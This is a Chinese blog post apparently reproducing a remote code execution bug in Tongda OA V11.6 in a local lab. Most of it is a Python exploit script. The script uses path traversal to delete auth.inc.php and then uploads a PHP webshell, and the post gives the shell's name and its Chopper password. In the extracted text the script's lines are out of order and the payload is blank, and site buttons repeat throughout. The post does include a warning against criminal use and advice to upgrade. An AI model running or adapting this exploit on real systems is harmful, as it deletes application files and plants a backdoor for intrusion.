【漏洞⽇记】深X服还没完，通达OA⼜搞RCE漏洞【OA V11.6】
Agan '
 338
 收藏 1
 原⼒计划
分类专栏： Web常⻅漏洞篇【免费】
 ⽂章标签： 通达OA RCE
2020-08-19 02:47:07
版权
当你的才华
还撑不起你的野⼼时
那你就应该静下⼼来学习
⽬录
0x01 通达OA V11.6 源码下载与安装
0x02 前⾔
0x03 复现漏洞
EXP 脚本
0x04 通达OA V11.5和V11.7 版本⽆法复现该漏洞过程
本次漏洞复现，只测试了三个版本：
通达 OA V11.7 (最新)
通达 OA V11.6
通达 OA V11.5
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
修复建议：升级⾄最新版本
PS：该漏洞影响很⼤，如果被成功利⽤后会删除OA所需要的php⽂件来绕过验证，
会对⽹站造成影响，建议渗透测试业务时，千万要让客户做系统备份或数据备份，很
容易出事... ...
请勿⽤作犯罪使⽤，⽹络不是法外之地，请珍惜⽣命，勿触犯法律... ...
你任何的动作，别⼈都知晓，⼈外有⼈，天外有天，且⾏且珍惜... ...
0x01 通达OA V11.6 源码下载与安装
通达OA V11.6 下载地址：http://www.kxdw.com/soft/23114.html
步骤1：运⾏安装包傻⽠式安装
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
步骤2：运⾏安装包傻⽠式安装
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
步骤3：运⾏安装包傻⽠式安装
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
步骤4：成功安装
0x02 前⾔
账号为：admin 密码为：空
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
先登录看看，密码为空，直接登录，样式是这样的
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
0x03 复现漏洞
EXP 脚本
EXP：直接打，直接写到⽹站根⽬录下，⽂件名为：_agan.php，菜⼑链接密码为：agan
1
import requests
2
3
target="http://192.168.159.137:8080/"
4
payload=""
5
print("[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA")
6
input("Press enter to continue")
7
print("[*]Deleting auth.inc.php....")
8
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
直接利⽤上述代码即可，改⼀下你的URL地址即可
成功利⽤
10
11
print("[*]Checking if file deleted...")
12
url=target+"/inc/auth.inc.php"
13
page=requests.get(url=url).text
14
if 'No input file specified.' not in page:
15
    print("[-]Failed to deleted auth.inc.php")
16
    exit(-1)
17
print("[+]Successfully deleted auth.inc.php!")
18
print("[*]Uploading payload...")
19
21
requests.post(url=url,files=files)
22
url=target+"/_agan.php"
23
page=requests.get(url=url).text
24
if 'No input file specified.' not in page:
25
    print("[+]Filed Uploaded Successfully")
26
    print("[+]URL:",url)
27
else:
28
    print("[-]Failed to upload file")
9
url=target+"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
requests.get(url=url)
url=target+"/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.<>./.<>./.<>./"
20
files = {'FILE1': ('agan.php', payload)}
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
可以看到成功写⼊，先访问这个⽬录看看，是真实存在的
链接地址：http://192.168.159.137:8080/_agan.php
再去服务端看看⽹站源码，是否也存在？
       明显是存在的，也写进去了
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
                                                                               连接看看
                                                                            成功连接
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
此时虽然拿到WebShell后，但OA 的⽂件已损坏，再次登录是这样的，猜测是通过删除auth.inc.php⽂件来写⼊
WebShell，导致引⽤的样式⽂件损坏
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
0x04 通达OA V11.5和V11.7 版本⽆法复现该漏洞过程
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
⽤之前的脚本再试试
V11.5和V11.7 服务端⽹站根⽬录下没写进去，看来没利⽤成功。
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
参考链接：
               https://mp.weixin.qq.com/s/5ObQlLc3XQY3oXXHJKieyA
               https://mp.weixin.qq.com/s/cr4Iqq3RfxnOzTqZWzGSAQ
虽然我们⽣活在阴沟⾥，但依然有⼈仰望星空！
显示推荐内容
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏
订阅博主
关注
点赞 3
评论 2
分享
收藏 1
⼿机看
打赏